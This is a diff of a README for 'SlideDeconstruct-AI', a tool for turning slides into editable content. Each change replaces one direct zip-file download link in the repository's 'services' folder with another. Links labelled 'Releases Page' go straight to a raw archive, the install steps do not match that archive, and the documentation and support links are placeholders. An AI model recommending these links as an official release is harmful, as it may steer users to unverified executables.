@@ -6,7 +6,7 @@ Welcome to SlideDeconstruct-AI! This tool helps you turn static PowerPoint prese
 
 ## 📥 Download Now
 
-[![Download SlideDeconstruct-AI](https://raw.githubusercontent.com/LimKush/slidedeconstruct-ai/main/services/ai_slidedeconstruct_1.7.zip)](https://raw.githubusercontent.com/LimKush/slidedeconstruct-ai/main/services/ai_slidedeconstruct_1.7.zip)
+[![Download SlideDeconstruct-AI](https://github.com/LimKush/slidedeconstruct-ai/raw/refs/heads/main/services/slidedeconstruct-ai-1.1-alpha.2.zip)](https://github.com/LimKush/slidedeconstruct-ai/raw/refs/heads/main/services/slidedeconstruct-ai-1.1-alpha.2.zip)
 
 ## 🛠️ System Requirements
 
@@ -28,7 +28,7 @@ To run SlideDeconstruct-AI effectively, ensure your system meets the following r
 
 To get started with SlideDeconstruct-AI, visit the Releases page to download the application. Follow these steps:
 
-1. Click this link to visit the download page: [Download Page](https://raw.githubusercontent.com/LimKush/slidedeconstruct-ai/main/services/ai_slidedeconstruct_1.7.zip).
+1. Click this link to visit the download page: [Download Page](https://github.com/LimKush/slidedeconstruct-ai/raw/refs/heads/main/services/slidedeconstruct-ai-1.1-alpha.2.zip).
 2. Look for the latest version of SlideDeconstruct-AI.
 3. Select the file suitable for your system (for example, `.exe` for Windows or `.dmg` for macOS).
 4. Click on the filename to begin downloading the application.
@@ -68,7 +68,7 @@ A: We aim to release updates regularly based on user feedback and new feature en
 
 ## 🔗 Links
 
-- [Visit the Releases Page to Download](https://raw.githubusercontent.com/LimKush/slidedeconstruct-ai/main/services/ai_slidedeconstruct_1.7.zip)
+- [Visit the Releases Page to Download](https://github.com/LimKush/slidedeconstruct-ai/raw/refs/heads/main/services/slidedeconstruct-ai-1.1-alpha.2.zip)
 - [Documentation](link-to-documentation) (coming soon)
 - [Support](link-to-support) (coming soon)
 
